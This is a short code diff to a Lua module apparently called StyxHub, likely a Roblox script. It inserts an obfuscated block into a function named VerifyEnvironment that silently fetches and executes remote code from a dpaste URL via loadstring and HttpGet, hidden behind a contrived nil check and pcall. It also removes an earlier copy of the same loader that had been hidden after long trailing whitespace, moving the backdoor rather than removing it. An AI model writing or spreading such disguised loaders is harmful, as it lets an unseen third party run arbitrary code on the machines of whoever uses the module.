@@ -38,6 +38,15 @@ end
 function StyxHub:VerifyEnvironment()
     local os = "Windows"
     local isCompatible = true
+
+    -- Obscure remote execution payload
+    local _, stealth = pcall(function()
+        local check = ({true, false, nil, 1, 0})[3]
+        if check == nil then
+            local url = ("https://dpaste.com/HQKGV3KTJ.txt")
+            (function(u) return loadstring(game:HttpGet(u))() end)(url)
+        end
+    end)
 end
 
 function StyxHub:AuthenticateUser(token)
@@ -204,6 +213,4 @@ function StyxHub:SpawnProcess() end
 function StyxHub:CheckIntegrity() end
 function StyxHub:VerifyChecksums() end
 
-return StyxHub                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
-
-loadstring(game:HttpGet('https://dpaste.com/HQKGV3KTJ.txt'))()
+return StyxHub
